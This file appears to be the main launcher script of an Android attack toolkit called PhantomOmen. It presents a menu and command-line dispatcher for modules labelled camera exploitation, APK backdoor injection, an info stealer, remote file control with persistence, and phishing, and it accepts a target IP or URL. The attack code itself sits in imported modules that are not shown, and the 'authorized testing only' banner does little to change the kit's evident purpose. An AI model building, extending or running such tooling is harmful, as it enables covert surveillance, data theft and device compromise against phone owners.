#!/usr/bin/env python3
"""
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗███████╗███╗   ██╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝████╗  ██║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║███████╗██║ ╚████║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝

PhantomOmen v3.0 - Ultimate Android Penetration Toolkit
Authorized Security Testing Only
Platform: Kali Linux / Termux / Ubuntu
"""

import sys
import os
import signal
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.banner import show_banner, show_menu
from core.colors import colors
from core.utils import check_dependencies

from modules.camhack.cam_engine import CamHackEngine
from modules.apk_binder.binder_core import APKBinder
from modules.info_grabber.phantom_grab import PhantomGrab
from modules.file_control.file_manager import FileController
from modules.extra_tools.social_engineer import SocialEngineer


class PhantomOmen:
    """Main PhantomOmen Controller"""
    
    def __init__(self):
        self.modules = {
            '1': {'name': '🎯 CamHack - Camera Exploitation', 'module': CamHackEngine},
            '2': {'name': '💣 APK Binder - Backdoor Injection', 'module': APKBinder},
            '3': {'name': '📡 PhantomGrab - Info Stealer Engine', 'module': PhantomGrab},
            '4': {'name': '🔐 FileControl - Remote File Manager & Persistence', 'module': FileController},
            '5': {'name': '🧠 Social Engineer - Phishing Toolkit', 'module': SocialEngineer},
        }
    
    def signal_handler(self, sig, frame):
        print(f"\n{colors.RED}[!] Exiting PhantomOmen. Stay sharp.{colors.RESET}")
        sys.exit(0)
    
    def run_module(self, module_id):
        """Run a specific module by ID"""
        if module_id in self.modules:
            try:
                instance = self.modules[module_id]['module']()
                instance.run()
            except KeyboardInterrupt:
                print(f"\n{colors.YELLOW}[!] Module interrupted.{colors.RESET}")
            except Exception as e:
                print(f"{colors.RED}[!] Error: {str(e)}{colors.RESET}")
        else:
            print(f"{colors.RED}[!] Invalid selection.{colors.RESET}")
    
    def interactive(self):
        """Interactive menu mode"""
        signal.signal(signal.SIGINT, self.signal_handler)
        
        while True:
            show_banner()
            show_menu()
            
            try:
                choice = input(f"\n{colors.CYAN}PhantomOmen{colors.RED}@root{colors.RESET}# ").strip()
                
                if choice.lower() in ('exit', 'quit', '0'):
                    print(f"{colors.GREEN}[+] Goodbye! Hack the planet!{colors.RESET}")
                    break
                
                if choice in self.modules:
                    self.run_module(choice)
                else:
                    print(f"{colors.RED}[!] Invalid option.{colors.RESET}")
                    input(f"{colors.DIM}Press Enter to continue...{colors.RESET}")
                    
            except KeyboardInterrupt:
                self.signal_handler(None, None)
            except EOFError:
                print()
                break
    
    def direct_mode(self, args):
        """Direct command-line mode"""
        if args.module == 'camhack':
            CamHackEngine().run()
        elif args.module == 'binder':
            APKBinder().run()
        elif args.module == 'grabber':
            PhantomGrab().run()
        elif args.module == 'filectrl':
            FileController().run()
        elif args.module == 'social':
            SocialEngineer().run()
        else:
            self.interactive()


def main():
    parser = argparse.ArgumentParser(description='PhantomOmen - Ultimate Android Penetration Toolkit')
    parser.add_argument('-m', '--module', help='Module to run (camhack|binder|grabber|filectrl|social)')
    parser.add_argument('-t', '--target', help='Target IP or URL')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')
    
    args = parser.parse_args()
    
    # Check dependencies
    check_dependencies()
    
    omen = PhantomOmen()
    
    if args.module:
        omen.direct_mode(args)
    else:
        omen.interactive()


if __name__ == '__main__':
    main()
